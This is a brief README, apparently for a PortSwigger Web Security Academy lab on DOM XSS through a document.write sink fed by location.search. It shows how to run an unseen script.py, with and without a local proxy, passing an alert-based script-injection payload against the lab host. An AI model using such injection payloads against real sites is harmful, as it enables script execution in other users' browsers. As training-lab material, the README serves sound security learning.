# How to run script.py

### DOM XSS in document.write sink using source location.search

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c 'test"><script>alert("XSS")</script>'`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c 'test"><script>alert("XSS")</script>' -p 127.0.0.1:8080`
